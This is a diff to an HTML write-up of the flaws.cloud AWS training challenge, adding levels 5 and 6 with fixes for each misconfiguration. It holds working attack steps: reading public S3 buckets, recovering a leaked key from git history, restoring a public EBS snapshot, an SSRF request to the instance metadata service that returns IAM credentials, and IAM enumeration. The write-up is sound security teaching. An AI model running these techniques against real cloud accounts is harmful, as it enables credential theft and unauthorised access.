@@ -3,8 +3,8 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>flAWS.cloud — Rajas Bakshi</title>
-<meta name="description" content="Writeup of flaws.cloud, levels 1 through 4: public S3 buckets, leaked git history, and a public EBS snapshot.">
+<title>flAWS.cloud || Rajas Bakshi</title>
+<meta name="description" content="Writeup of flaws.cloud, levels 1 through 6: public S3 buckets, leaked git history, a public EBS snapshot, SSRF to instance metadata, and IAM enumeration.">
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Newsreader:wght@300;400&family=Figtree:wght@400;500&display=swap" rel="stylesheet">
@@ -77,11 +77,11 @@ footer{border-top:1px solid var(--line);padding:2rem 0 4rem;color:var(--muted);f
     <div class="hero">
       <h1>flAWS.cloud</h1>
       <p class="lede">A walkthrough of flaws.cloud, a deliberately misconfigured AWS environment. Each level is its own S3 bucket or resource, and each one teaches a specific, real-world cloud misconfiguration.</p>
-      <p class="meta">Levels 1&ndash;4 &middot; all challenges run as sub-domains of a single AWS account</p>
+      <p class="meta">All 6 levels, solved &middot; all challenges run as sub-domains of a single AWS account</p>
     </div>
 
     <section class="level" id="level-1">
-      <h2>Level 1 &mdash; Public bucket listing</h2>
+      <h2>Level 1: Public bucket listing</h2>
       <p class="level-url"><code>flaws.cloud</code></p>
 
       <p>The site gives no setup instructions, but the task description's word &ldquo;buckets&rdquo; is a strong hint toward S3.</p>
@@ -130,7 +130,7 @@ Level 2 is at http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud</code><
     </section>
 
     <section class="level" id="level-2">
-      <h2>Level 2 &mdash; Open to &ldquo;any authenticated AWS user&rdquo;</h2>
+      <h2>Level 2: Open to &ldquo;any authenticated AWS user&rdquo;</h2>
       <p class="level-url"><code>level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud</code></p>
 
       <p>This level required a real AWS identity rather than an anonymous request, so the CLI was configured with a personal IAM account first.</p>
@@ -151,13 +151,13 @@ Level 2 is at http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud</code><
 
       <dl class="finding-grid">
         <dt>Finding</dt><dd>The bucket grants access to any authenticated AWS user, not a specific one. An anonymous request fails, but signing with <em>any</em> valid AWS account's credentials succeeds.</dd>
-        <dt>Impact</dt><dd>Anyone holding an AWS account &mdash; not a specific one &mdash; can list and read the bucket's contents.</dd>
+        <dt>Impact</dt><dd>Anyone holding an AWS account, not a specific one, can list and read the bucket's contents.</dd>
         <dt>Fix</dt><dd>Scope bucket permissions to specific principals rather than the broad &ldquo;any authenticated AWS user&rdquo; group, which is far less restrictive than its name implies.</dd>
       </dl>
     </section>
 
     <section class="level" id="level-3">
-      <h2>Level 3 &mdash; Leaked AWS key via git history</h2>
+      <h2>Level 3: Leaked AWS key via git history</h2>
       <p class="level-url"><code>level3-9afd3927f195e10225021a578e6f78df.flaws.cloud</code></p>
       <blockquote>&ldquo;Time to find your first AWS key! I bet you'll find something that will let you list what other buckets are.&rdquo;</blockquote>
 
@@ -171,7 +171,7 @@ Level 2 is at http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud</code><
 2017-02-27 05:44:33       1035 hint4.html
 2020-05-22 23:51:10       1861 index.html
 2017-02-27 05:44:33         26 robots.txt</code></pre>
-      <p>A <code>.git/</code> directory sitting inside a web-served bucket means the whole repository &mdash; including history &mdash; was deployed by mistake. Deleted files still exist in past commits.</p>
+      <p>A <code>.git/</code> directory sitting inside a web-served bucket means the whole repository: including history: was deployed by mistake. Deleted files still exist in past commits.</p>
       <p>Sync the bucket locally and inspect it as a normal git repo:</p>
       <pre><code>aws s3 sync s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud ./level3
 cd level3/.git
@@ -194,7 +194,7 @@ index e3ae6dd..0000000
 @@ -1,2 +0,0 @@
 -access_key AKIAJ366LIPB4IJKT7SA
 -secret_access_key <span class="redacted">[REDACTED]</span></code></pre>
-      <p>The commit that <em>removed</em> the file still shows exactly what was in it &mdash; deleting a secret from the working tree does nothing to erase it from history.</p>
+      <p>The commit that <em>removed</em> the file still shows exactly what was in it: deleting a secret from the working tree does nothing to erase it from history.</p>
 
       <h3>Exploitation</h3>
       <pre><code>aws s3 ls --profile level3AccessKey</code></pre>
@@ -212,13 +212,13 @@ index e3ae6dd..0000000
       <p class="level-url">Further reading: <a href="https://summitroute.com/blog/2015/12/24/instagram_bounty_case_study_for_defense/" target="_blank" rel="noopener">Instagram bug bounty case study</a></p>
 
       <dl class="finding-grid">
-        <dt>Finding</dt><dd>AWS credentials were committed to a git repo, then &ldquo;removed&rdquo; in a later commit &mdash; but remained fully recoverable from history. The leaked key granted broad <code>s3:ListBucket</code> access across the account.</dd>
-        <dt>Fix</dt><dd>Revoke any credentials that may have touched version control immediately, regardless of whether they were later removed. Scan repositories for secrets before every commit &mdash; this class of leak is extremely common in real-world codebases.</dd>
+        <dt>Finding</dt><dd>AWS credentials were committed to a git repo, then &ldquo;removed&rdquo; in a later commit: but remained fully recoverable from history. The leaked key granted broad <code>s3:ListBucket</code> access across the account.</dd>
+        <dt>Fix</dt><dd>Revoke any credentials that may have touched version control immediately, regardless of whether they were later removed. Scan repositories for secrets before every commit: this class of leak is extremely common in real-world codebases.</dd>
       </dl>
     </section>
 
     <section class="level" id="level-4">
-      <h2>Level 4 &mdash; Public EBS snapshot</h2>
+      <h2>Level 4: Public EBS snapshot</h2>
       <p class="level-url"><code>4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud</code></p>
       <blockquote>&ldquo;You need to get access to the web page running on an EC2. A snapshot was made of that EC2 shortly after nginx was set up on it.&rdquo;</blockquote>
 
@@ -251,7 +251,7 @@ index e3ae6dd..0000000
       </figure>
 
       <div class="callout">
-        <p><strong>Background &mdash; EBS snapshots.</strong> An EC2 instance's OS runs on an EBS volume; a snapshot is a point-in-time backup of that volume. Sharing has three levels: <strong>private</strong> (owner only), <strong>shared</strong> (specific accounts), and <strong>public</strong> (anyone can restore it).</p>
+        <p><strong>Background: EBS snapshots.</strong> An EC2 instance's OS runs on an EBS volume; a snapshot is a point-in-time backup of that volume. Sharing has three levels: <strong>private</strong> (owner only), <strong>shared</strong> (specific accounts), and <strong>public</strong> (anyone can restore it).</p>
       </div>
 
       <p>Confirm this snapshot's sharing permissions:</p>
@@ -271,7 +271,7 @@ index e3ae6dd..0000000
       <pre><code>UnauthorizedOperation: User: arn:aws:iam::975426262029:user/backup is not
 authorized to perform: ec2:CreateVolume ...</code></pre>
       <div class="callout">
-        <p><strong>Lesson.</strong> The <code>backup</code> account's own IAM permissions and the snapshot's <em>public</em> sharing setting are two separate things. It could discover the snapshot but was never granted <code>ec2:CreateVolume</code>. Since the snapshot is public, any AWS account &mdash; including a personal one &mdash; can act on it directly.</p>
+        <p><strong>Lesson.</strong> The <code>backup</code> account's own IAM permissions and the snapshot's <em>public</em> sharing setting are two separate things. It could discover the snapshot but was never granted <code>ec2:CreateVolume</code>. Since the snapshot is public, any AWS account: including a personal one: can act on it directly.</p>
       </div>
       <pre><code>aws ec2 create-volume \
   --snapshot-id snap-0b49342abd1bdcb89 \
@@ -286,13 +286,13 @@ authorized to perform: ec2:CreateVolume ...</code></pre>
     "SnapshotId": "snap-0b49342abd1bdcb89",
     "Encrypted": false
 }</code></pre>
-      <p>Once the volume is <code>available</code>, attach it to a personal EC2 instance in the same AZ &mdash; a volume can only attach to an instance in its own availability zone:</p>
+      <p>Once the volume is <code>available</code>, attach it to a personal EC2 instance in the same AZ: a volume can only attach to an instance in its own availability zone:</p>
       <pre><code>aws ec2 attach-volume \
   --volume-id vol-0598e67b195f014bb \
   --instance-id i-0826d0ca277e3705e \
   --device /dev/sdf \
   --region us-west-2</code></pre>
-      <p>SSH in and locate the disk &mdash; modern instance types use NVMe naming rather than the requested device name:</p>
+      <p>SSH in and locate the disk: modern instance types use NVMe naming rather than the requested device name:</p>
       <pre><code>lsblk</code></pre>
       <pre><code>NAME          MAJ:MIN RM SIZE RO TYPE MOUNTPOINTS
 nvme0n1       259:0    0   8G  0 disk
@@ -312,13 +312,114 @@ Good work getting in. This level is described at
 http://level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud/243f422c/</code></pre>
 
       <dl class="finding-grid">
-        <dt>Finding</dt><dd>A public EBS snapshot of an EC2 root volume allowed full filesystem access &mdash; config, content, everything on disk &mdash; simply by restoring it into any AWS account.</dd>
+        <dt>Finding</dt><dd>A public EBS snapshot of an EC2 root volume allowed full filesystem access: config, content, everything on disk: simply by restoring it into any AWS account.</dd>
         <dt>Fix</dt><dd>Never share EBS snapshots publicly. If cross-account sharing is needed, authorize specific account IDs rather than <code>all</code>, and audit snapshot sharing settings regularly.</dd>
       </dl>
     </section>
 
-    <section id="more">
-      <p class="meta">Levels 5 and 6 to follow.</p>
+    <section class="level" id="level-5">
+      <h2>Level 5: SSRF to Instance Metadata</h2>
+      <p class="level-url"><code>level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud/243f422c/</code></p>
+      <blockquote>This EC2 has a simple HTTP-only proxy on it. See if you can use it to list the contents of the level 6 bucket, which has a hidden directory in it.</blockquote>
+
+      <h3>Recon</h3>
+      <p>The proxy works as <code>/proxy/&lt;hostname&gt;/...</code>. Tried hitting the EC2 host directly, without <code>/proxy/</code> in front.</p>
+      <figure>
+        <img src="img/level5-direct-denied-1.png" alt="Direct request to the EC2 host without the proxy prefix, asking for credentials">
+      </figure>
+      <p>Tried the same for <code>flaws.cloud</code> without <code>/proxy/</code>.</p>
+      <figure>
+        <img src="img/level5-direct-denied-2.png" alt="Second direct request without the proxy prefix, also asking for credentials">
+      </figure>
+      <p>Same result both times: creds required. Adding <code>/proxy/</code> back in front makes it succeed. Dead end, but it confirmed this box is nothing but a proxy, with nothing else exposed on it directly. HTTPS through the proxy also times out, likely blocked at the security group level.</p>
+      <p>The real insight: a proxy fetches <em>anything</em> you point it at, not just public hostnames. Every EC2 instance can reach <code>169.254.169.254</code>, AWS's Instance Metadata Service (IMDS), unauthenticated by design. This is the classic SSRF-to-cloud-metadata pattern.</p>
+
+      <h3>Exploitation</h3>
+      <pre><code>http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/</code></pre>
+      <p>Got back the list of supported IMDS API versions.</p>
+      <figure>
+        <img src="img/level5-imds-versions.png" alt="Response listing supported IMDS API versions">
+      </figure>
+      <p>Drilled into <code>latest/meta-data/</code>:</p>
+      <figure>
+        <img src="img/level5-imds-metadata.png" alt="Metadata listing showing an iam folder among other entries">
+      </figure>
+      <p>Drilled into <code>iam/</code> then <code>security-credentials/</code>, found the attached IAM role name, and fetched its credentials:</p>
+      <pre><code>http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/&lt;role-name&gt;</code></pre>
+      <pre><code>{
+    "Code" : "Success",
+    "AccessKeyId" : "ASIA6GG7PSQGZM6BOV6A",
+    "SecretAccessKey" : "[REDACTED]",
+    "Token" : "[REDACTED, long session token]",
+    "Expiration" : "2026-11-22T16:25:38Z"
+}</code></pre>
+      <figure>
+        <img src="img/level5-iam-credentials.png" alt="Temporary IAM credentials returned by the instance metadata service">
+      </figure>
+      <p>Temporary credentials, lifted straight from the instance's own IAM role with no authentication at all. Using them:</p>
+      <pre><code>aws s3 ls s3://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud --profile l5key</code></pre>
+      <pre><code>                           PRE ddcc78ff/
+2017-02-27 07:41:07        871 index.html</code></pre>
+      <p>Found the hidden directory, and inside it the real completion page for the level (the bucket root's <code>index.html</code> is just a taunt telling you to solve this level properly first).</p>
+
+      <dl class="finding-grid">
+        <dt>Finding</dt><dd>The EC2 proxy is vulnerable to SSRF: it fetches any URL it's given, including AWS's internal metadata service, with no authentication required.</dd>
+        <dt>Impact</dt><dd>Full use of whatever permissions the attached IAM role holds, which here was enough to reach the level 6 bucket's hidden directory.</dd>
+        <dt>Fix</dt><dd>Never expose a raw, unauthenticated URL-fetching proxy to untrusted input. Use IMDSv2, which requires a signed token request first and specifically blocks this pattern. Keep instance roles as tight as possible.</dd>
+      </dl>
+    </section>
+
+    <section class="level" id="level-6">
+      <h2>Level 6: SecurityAudit Key, Account-Wide Enumeration</h2>
+      <p class="level-url"><code>level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ddcc78ff/index.html</code></p>
+      <blockquote>You're getting a user access key with the SecurityAudit policy attached. See what else it can do and what else you might find in this account.</blockquote>
+
+      <h3>Recon</h3>
+      <p><code>SecurityAudit</code> is a real AWS managed policy granting broad read-only access across almost every service. Dumped the account's full IAM structure in one call:</p>
+      <pre><code>aws iam get-account-authorization-details --profile level6key --region us-west-2</code></pre>
+      <p>The <code>Level6</code> user had two policies: the expected <code>SecurityAudit</code>, and a second, oddly specific one called <strong>list_apigateways</strong>: a clear signal worth investigating. It granted <code>apigateway:GET</code> on a specific <code>execute-api</code> resource, meaning this identity could actually <em>invoke</em> a deployed API Gateway endpoint, not just read its configuration.</p>
+
+      <h3>A dead end, and the pivot</h3>
+      <p>The API ID named directly in that IAM policy turned out to be stale: both the management API and a plain DNS check confirmed the resource no longer exists:</p>
+      <pre><code>curl -v https://puspzvwgb6.execute-api.us-west-2.amazonaws.com/prod/
+* Could not resolve host: puspzvwgb6.execute-api.us-west-2.amazonaws.com</code></pre>
+      <p>This backend account has existed since 2017 and been rebuilt more than once since. An old IAM policy document isn't a reliable source of what's actually deployed right now. The more trustworthy source turned out to be the attached Lambda function's own resource policy:</p>
+      <pre><code>aws lambda get-policy --function-name Level6 --profile l6Key --region us-west-2</code></pre>
+      <pre><code>{
+    "Policy": "{...\"AWS:SourceArn\":\"arn:aws:execute-api:us-west-2:975426262029:s33ppypa75/*/GET/level6\"...}"
+}</code></pre>
+      <p>That revealed the real, currently-live API Gateway ID (<code>s33ppypa75</code>), plus the exact method and path wired to it.</p>
+
+      <h3>Exploitation</h3>
+      <pre><code>aws apigateway get-stages --rest-api-id s33ppypa75 --profile l6Key --region us-west-2</code></pre>
+      <pre><code>{"item": [{"stageName": "Prod", ...}]}</code></pre>
+      <pre><code>curl https://s33ppypa75.execute-api.us-west-2.amazonaws.com/Prod/level6</code></pre>
+      <pre><code>"Go to http://theend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud/d730aa2b/"</code></pre>
+      <p>Challenge complete.</p>
+
+      <dl class="finding-grid">
+        <dt>Finding</dt><dd>An unusually narrow custom IAM policy granted <code>execute-api</code> invoke access to a specific API Gateway resource: far more targeted than the general SecurityAudit access, and a clear sign of a deliberately placed path.</dd>
+        <dt>Impact</dt><dd>The exposed API Gateway and Lambda function led straight to the account's intended final privilege-escalation outcome.</dd>
+        <dt>Fix</dt><dd>Scope API Gateway invoke permissions tightly and review them regularly. Don't trust an IAM policy document as the single source of truth for what infrastructure currently exists: cross-check against the live resource itself. Treat unusually narrow or oddly-named custom policies as worth investigating on sight.</dd>
+      </dl>
+    </section>
+
+    <section id="lessons">
+      <h2>Overall Lessons</h2>
+      <div class="body">
+        <p>Across all six levels, the common thread is the same question asked six different ways: who or what can reach this, and is that actually who it should be?</p>
+        <ol>
+          <li>Public S3 bucket listing: anonymous <code>s3:ListBucket</code> exposed files meant to stay hidden.</li>
+          <li>Overly broad bucket grants: "any authenticated AWS user" is a much wider group than it sounds.</li>
+          <li>Secrets in git history: deleting a file in a later commit doesn't erase it from history.</li>
+          <li>Public EBS snapshots: a backup meant to stay private, shared with "everyone," handed over an entire filesystem.</li>
+          <li>SSRF to cloud metadata: any server that fetches URLs on your behalf is a path to an instance's IAM credentials.</li>
+          <li>Stale IAM references and narrow custom policies: old policy documents can point at infrastructure that's since changed.</li>
+        </ol>
+      </div>
+      <figure>
+        <img src="img/flaws-complete.png" alt="flaws.cloud challenge completed">
+      </figure>
     </section>
   </main>
 
